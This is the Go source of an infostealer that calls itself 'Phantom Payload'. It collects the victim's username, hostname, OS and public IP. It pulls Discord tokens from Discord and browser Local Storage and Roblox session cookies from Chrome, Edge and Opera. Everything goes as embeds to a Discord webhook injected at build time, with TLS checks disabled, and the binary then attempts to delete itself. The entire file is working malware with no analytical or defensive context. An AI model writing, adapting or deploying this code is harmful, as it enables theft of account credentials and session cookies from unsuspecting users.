package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"
)

// Injected via ldflags
var (
	WebhookURL string
	Timestamp  string
)

type SystemReport struct {
	Username      string   `json:"username"`
	Hostname      string   `json:"hostname"`
	OS            string   `json:"os"`
	Arch          string   `json:"arch"`
	CPUs          int      `json:"cpus"`
	PublicIP      string   `json:"public_ip"`
	DiscordTokens []string `json:"discord_tokens"`
	RobloxCookies []string `json:"roblox_cookies"`
	Browsers      []string `json:"browsers_found"`
	Timestamp     string   `json:"timestamp"`
}

func main() {
	if WebhookURL == "" {
		return
	}

	report := gatherEverything()
	sendReport(report)

	// Self-delete
	defer os.Remove(os.Args[0])
}

func gatherEverything() SystemReport {
	currUser, _ := user.Current()
	hostname, _ := os.Hostname()

	report := SystemReport{
		Username:  currUser.Username,
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		CPUs:      runtime.NumCPU(),
		PublicIP:  getPublicIP(),
		Timestamp: Timestamp,
	}

	report.DiscordTokens = extractDiscordTokens()
	report.RobloxCookies = extractRobloxCookies()
	report.Browsers = findBrowsers()

	return report
}

func getPublicIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()
	ip, _ := io.ReadAll(resp.Body)
	return string(ip)
}

func findBrowsers() []string {
	var found []string
	home, _ := os.UserHomeDir()

	paths := map[string]string{
		"Chrome":  filepath.Join(home, "AppData", "Local", "Google", "Chrome"),
		"Edge":    filepath.Join(home, "AppData", "Local", "Microsoft", "Edge"),
		"Brave":   filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser"),
		"Opera":   filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Firefox": filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox"),
	}

	for name, path := range paths {
		if _, err := os.Stat(path); err == nil {
			found = append(found, name)
		}
	}
	return found
}

func extractDiscordTokens() []string {
	var tokens []string
	home, _ := os.UserHomeDir()

	paths := []string{
		filepath.Join(home, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
		filepath.Join(home, "AppData", "Roaming", "DiscordCanary", "Local Storage", "leveldb"),
		filepath.Join(home, "AppData", "Roaming", "DiscordPTB", "Local Storage", "leveldb"),
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
	}

	re := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)

	for _, path := range paths {
		files, err := os.ReadDir(path)
		if err != nil {
			continue
		}

		for _, file := range files {
			if !strings.HasSuffix(file.Name(), ".log") && !strings.HasSuffix(file.Name(), ".ldb") {
				continue
			}

			content, err := os.ReadFile(filepath.Join(path, file.Name()))
			if err != nil {
				continue
			}

			matches := re.FindAllString(string(content), -1)
			for _, match := range matches {
				if !contains(tokens, match) {
					tokens = append(tokens, match)
				}
			}
		}
	}
	return tokens
}

func extractRobloxCookies() []string {
	var cookies []string
	home, _ := os.UserHomeDir()

	paths := []string{
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable", "Network", "Cookies"),
	}

	re := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-.*\|_[\w\d]+`)

	for _, path := range paths {
		content, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		matches := re.FindAllString(string(content), -1)
		for _, match := range matches {
			if !contains(cookies, match) {
				cookies = append(cookies, match)
			}
		}
	}
	return cookies
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func formatList(list []string, limit int) string {
	if len(list) == 0 {
		return "❌ No data found"
	}
	res := ""
	for i, item := range list {
		if i >= limit {
			res += fmt.Sprintf("\n... and %d more items", len(list)-limit)
			break
		}
		res += fmt.Sprintf("`%s` \n", item)
	}
	if len(res) > 1000 {
		return res[:997] + "..."
	}
	return res
}

func sendReport(report SystemReport) {
	// Construction de l'interface visuelle via plusieurs embeds
	embeds := []map[string]interface{}{
		{
			"title": "👻 Phantom Payload Executed",
			"color": 0x2c3e50,
			"fields": []map[string]interface{}{
				{"name": "👤 User", "value": fmt.Sprintf("`%s`", report.Username), "inline": true},
				{"name": "💻 Hostname", "value": fmt.Sprintf("`%s`", report.Hostname), "inline": true},
				{"name": "🌐 Public IP", "value": fmt.Sprintf("`%s`", report.PublicIP), "inline": true},
				{"name": "🖥️ OS", "value": fmt.Sprintf("`%s (%s)`", report.OS, report.Arch), "inline": true},
				{"name": "⚙️ CPUs", "value": fmt.Sprintf("`%d`", report.CPUs), "inline": true},
				{"name": "🕒 Generated At", "value": fmt.Sprintf("`%s`", report.Timestamp), "inline": false},
				{"name": "🌐 Browsers Found", "value": fmt.Sprintf("`%s`", strings.Join(report.Browsers, ", ")), "inline": false},
			},
			"footer": map[string]string{"text": "Phantom Generator v1.0 | System Report"},
		},
	}

	// Embed pour les Tokens Discord
	if len(report.DiscordTokens) > 0 {
		embeds = append(embeds, map[string]interface{}{
			"title":       "📱 Discord Tokens Captured",
			"color":       0x5865F2,
			"description": formatList(report.DiscordTokens, 8),
			"footer":      map[string]string{"text": fmt.Sprintf("Total Tokens: %d", len(report.DiscordTokens))},
		})
	} else {
		embeds = append(embeds, map[string]interface{}{
			"title":       "📱 Discord Tokens",
			"color":       0xe74c3c,
			"description": "❌ No Discord tokens found on this system.",
		})
	}

	// Embed pour les Cookies Roblox
	if len(report.RobloxCookies) > 0 {
		embeds = append(embeds, map[string]interface{}{
			"title":       "🎮 Roblox Cookies Captured",
			"color":       0xFFFFFF,
			"description": formatList(report.RobloxCookies, 5),
			"footer":      map[string]string{"text": fmt.Sprintf("Total Cookies: %d", len(report.RobloxCookies))},
		})
	} else {
		embeds = append(embeds, map[string]interface{}{
			"title":       "🎮 Roblox Cookies",
			"color":       0xe74c3c,
			"description": "❌ No Roblox cookies found on this system.",
		})
	}

	payload := map[string]interface{}{
		"embeds": embeds,
	}

	jsonData, _ := json.Marshal(payload)

	req, _ := http.NewRequest("POST", WebhookURL, bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Do(req)
}
